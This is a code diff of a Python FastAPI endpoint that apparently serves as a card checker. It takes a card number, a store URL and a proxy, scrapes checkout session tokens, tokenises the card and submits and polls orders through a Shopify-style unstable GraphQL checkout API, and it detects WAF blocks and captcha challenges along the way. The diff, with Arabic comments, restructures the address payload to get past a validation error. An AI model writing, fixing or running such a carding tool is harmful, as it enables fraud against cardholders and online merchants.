@@ -9,6 +9,7 @@ import urllib3
 from html import unescape
 from urllib.parse import urlparse
 
+# إخفاء تحذيرات SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = FastAPI()
@@ -95,7 +96,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             html_chk = res_chk.text
             final_url = str(res_chk.url)
 
-            if res_chk.status_code in [403, 429]: return JSONResponse(content=safe_response("WAF Blocked Checkout", html_chk[:80], price))
+            if res_chk.status_code in [403, 429]:
+                return JSONResponse(content=safe_response("WAF Blocked Checkout", html_chk[:80], price))
+            
             if 'hcaptcha' in html_chk.lower() or 'g-recaptcha' in html_chk.lower() or 'challenge-platform' in html_chk.lower():
                 return JSONResponse(content=safe_response("Store Demands Captcha", html_chk[:80], price))
 
@@ -108,8 +111,10 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             meta_st = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
             js_st = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']{20,})["\']', html_chk, re.IGNORECASE)
             
-            if meta_st: is_graphql = True; session_token = unescape(meta_st.group(1))
-            elif js_st: is_graphql = True; session_token = unescape(js_st.group(1))
+            if meta_st:
+                is_graphql = True; session_token = unescape(meta_st.group(1))
+            elif js_st:
+                is_graphql = True; session_token = unescape(js_st.group(1))
             else:
                 jwt_match = re.search(r'(eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})', html_chk)
                 if jwt_match: is_graphql = True; session_token = jwt_match.group(1)
@@ -132,27 +137,16 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             card_session_id = res_pci.json().get("id")
 
             # =========================================================
-            # التعديل الجراحي لحل خطأ (DeliveryTermsInput invalid value)
+            # التعديل الصارم: بنية العنوان المطلوبة بالضبط لـ GraphQL
             # =========================================================
-            
-            # 1. عنوان حساب الشحن (جغرافي فقط بدون أسماء لتجنب رفض GraphQL)
-            geo_address = {
-                "address1": buyer["address1"],
-                "city": buyer["city"],
-                "countryCode": buyer["country"],
-                "postalCode": buyer["zip"],
-                "zoneCode": buyer["province"]
-            }
-            
-            # 2. عنوان الفاتورة والدفع (يحتوي على الاسم ورقم الهاتف)
-            full_address = {
-                "address1": buyer["address1"],
-                "city": buyer["city"],
-                "countryCode": buyer["country"],
-                "firstName": buyer["first_name"],
-                "lastName": buyer["last_name"],
+            flat_address = {
+                "address1": buyer["address1"], 
+                "city": buyer["city"], 
+                "countryCode": buyer["country"], 
+                "firstName": buyer["first_name"], 
+                "lastName": buyer["last_name"], 
                 "phone": buyer["phone"],
-                "postalCode": buyer["zip"],
+                "postalCode": buyer["zip"], 
                 "zoneCode": buyer["province"]
             }
 
@@ -167,7 +161,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             prop_vars = {
                 "delivery": {
                     "deliveryLines": [{
-                        "destination": {"partialStreetAddress": geo_address}, # تم إرسال الجغرافي فقط هنا
+                        "destination": flat_address,  # تم إسناد العنوان مباشرة هنا بدون partialStreetAddress
                         "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                         "deliveryMethodTypes": ["SHIPPING"],
                         "destinationChanged": True,
@@ -179,7 +173,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "payment": {
                     "totalAmount": {"any": True},
                     "paymentLines": [],
-                    "billingAddress": {"streetAddress": full_address}
+                    "billingAddress": flat_address
                 },
                 "merchandise": {
                     "merchandiseLines": [{
@@ -202,7 +196,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
             
             if not queue_token: 
-                return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:80], price))
+                return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:100], price))
             time.sleep(1)
 
             sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
@@ -214,7 +208,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     "queueToken": queue_token,
                     "delivery": {
                         "deliveryLines": [{
-                            "destination": {"streetAddress": full_address}, # في التأكيد النهائي يتم إرسال العنوان كاملاً
+                            "destination": flat_address, # تم إسناد العنوان مباشرة هنا
                             "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                             "deliveryMethodTypes": ["SHIPPING"],
                             "destinationChanged": False,
@@ -231,12 +225,12 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                                 "directPaymentMethod": {
                                     "paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319",
                                     "sessionId": card_session_id,
-                                    "billingAddress": {"streetAddress": full_address}
+                                    "billingAddress": flat_address
                                 }
                             },
                             "amount": {"any": True}
                         }],
-                        "billingAddress": {"streetAddress": full_address}
+                        "billingAddress": flat_address
                     },
                     "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
                 }
@@ -252,7 +246,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             
             receipt_id = sub_data.get('receipt', {}).get('id')
             if not receipt_id: 
-                return JSONResponse(content=safe_response("Submit Failed", res_sub.text[:80], price))
+                return JSONResponse(content=safe_response("Submit Failed", res_sub.text[:100], price))
 
             poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
             poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
